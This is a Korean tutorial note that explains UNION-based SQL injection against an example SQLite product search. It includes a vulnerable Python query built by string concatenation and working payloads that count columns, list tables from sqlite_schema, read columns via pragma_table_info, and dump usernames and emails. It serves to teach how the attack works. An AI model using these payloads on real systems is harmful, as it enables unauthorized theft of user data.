---
title: UNION 기반 SQL 인젝션으로 테이블과 열 찾기
category: sql-injection
category_title: SQL 인젝션
tags: [SQL, SQL 인젝션, 데이터베이스]
note_kind: note
---

# UNION 기반 SQL 인젝션으로 테이블과 열 찾기

상품 검색 결과가 화면에 표시되고, 서버가 검색어를 SQL에 직접 이어 붙인다고 하자. 예제 데이터베이스에는 `products(name, description, category)`와 `users(username, email)`가 있지만, 검색하는 사람은 `users`라는 이름을 아직 모른다.

```python
sql = f"SELECT name, description FROM products WHERE category = '{category}'"
rows = connection.execute(sql).fetchall()
```

입력의 `'`로 문자열을 닫으면 뒤에 `UNION SELECT`를 붙일 수 있다. 데이터베이스는 원래 상품 조회의 행과 새 `SELECT`의 행을 하나의 결과로 합친다. 끝의 `-- -`는 서버가 이어 붙이는 마지막 `'`를 주석으로 만든다.

## 결과의 열 수와 표시 위치 확인

`UNION`으로 합치는 두 `SELECT`는 열 수가 같아야 한다. 원래 쿼리를 모를 때는 `ORDER BY`에 결과 열의 번호를 넣어 경계를 찾을 수 있다. `Gifts' ORDER BY 1-- -`과 `Gifts' ORDER BY 2-- -`는 동작하는데 `Gifts' ORDER BY 3-- -`에서 오류가 난다면, 원래 결과는 두 열이다.

이 예제의 두 열은 `name`, `description`이다. 같은 열 수로 `UNION SELECT`를 붙여 확인한다. `NULL`은 열의 자료형과 충돌할 가능성이 낮다.

```sql fragment
Gifts' UNION SELECT NULL, NULL-- -
```

이어서 각 칸에 서로 다른 문자열을 넣는다.

```sql fragment
Gifts' UNION SELECT '왼쪽', '오른쪽'-- -
```

화면에 두 문자열이 보이면, 그 두 칸으로 다음 조회 결과를 읽을 수 있다. `NULL` 두 개가 성공해도 결과가 화면에 보이는지는 따로 확인해야 한다.

## 테이블 이름 찾기

SQLite의 `sqlite_schema`에는 테이블과 뷰 같은 객체의 이름과 종류가 기록된다. 그중 이름과 종류를 상품 검색 결과의 두 칸에 맞춰 가져온다.

```sql fragment
Gifts' UNION SELECT name, type
FROM sqlite_schema
WHERE type IN ('table', 'view')-- -
```

예제에서는 `products | table`, `users | table`이 보인다. 여기서 `users`라는 이름을 처음 알게 된다. `sqlite_schema`는 앱이 만든 데이터 테이블이 아니라 SQLite가 관리하는 스키마 테이블이며, `sqlite_master`라는 이름으로도 조회할 수 있다.

## 열 이름 찾기

이제 `users`의 열 정보를 조회한다. SQLite의 `pragma_table_info`는 테이블의 열 정보를 `SELECT`에서 읽을 수 있게 하는 함수다.

```sql fragment
Gifts' UNION SELECT name, type
FROM pragma_table_info('users')-- -
```

결과에 `username | TEXT`, `email | TEXT`가 보이면 다음 쿼리에 쓸 열 이름을 알 수 있다. 이 단계에서 읽은 것은 사용자 데이터가 아니라 테이블의 구조다.

## 알아낸 열로 데이터 읽기

마지막으로 열 두 개를 원래 결과의 두 칸에 맞춰 가져온다.

```sql fragment
Gifts' UNION SELECT username, email FROM users-- -
```

흐름은 **결과의 모양 확인 → 객체 이름 확인 → 열 이름 확인 → 데이터 조회**다. 이 예시는 SQLite의 메타데이터 이름을 쓴다. 다른 DBMS에서는 목록을 조회하는 대상이 다르며, 실제로 읽을 수 있는 데이터는 앱의 DB 계정 권한에 따른다.

## 참고

- [PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQLite — The Schema Table](https://www.sqlite.org/schematab.html)
- [SQLite — PRAGMA functions](https://www.sqlite.org/pragma.html#pragma_functions)

